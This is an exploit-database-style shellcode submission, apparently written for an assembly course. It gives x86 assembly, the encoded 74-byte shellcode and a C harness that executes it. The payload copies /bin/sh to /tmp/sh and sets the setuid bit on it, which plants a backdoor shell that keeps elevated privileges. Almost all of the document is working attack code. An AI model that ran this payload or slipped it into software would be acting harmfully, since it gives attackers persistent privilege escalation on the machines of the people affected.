/*

Title: Linux/x86 - cp /bin/sh /tmp/sh; chmod +s /tmp/sh
Author: absolomb
Website: https://www.sploitspren.com
SLAE-ID: 1208
Purpose: cp shell into /tmp and setuid
Tested On: Ubuntu 14.04
Arch: x86
Size: 74 bytes

Shellcode is register independent and null free.

global _start

section .text
_start:

	push 0xb		; execve()
	pop eax			;
	cdq    			; set edx to 0
	push edx		; NULL
	push word 0x632d	; "c-"
	mov edi,esp		; point edi to stack
	push edx		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f		; "/bin"
	mov ebx,esp		; point ebx to stack
	push edx		; NULL

	jmp short cmd

execute:

	push edi		; "c-"
	push ebx		; "/bin/sh"
	mov ecx,esp		; point to stack
	int 0x80		; execute execve


cmd:
	call execute
	db "cp /bin/sh /tmp/sh; chmod +s /tmp/sh"
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\xeb\x06\x57\x53\x89\xe1\xcd\x80\xe8\xf5\xff\xff\xff\x63\x70\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x2b\x73\x20\x2f\x74\x6d\x70\x2f\x73\x68";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}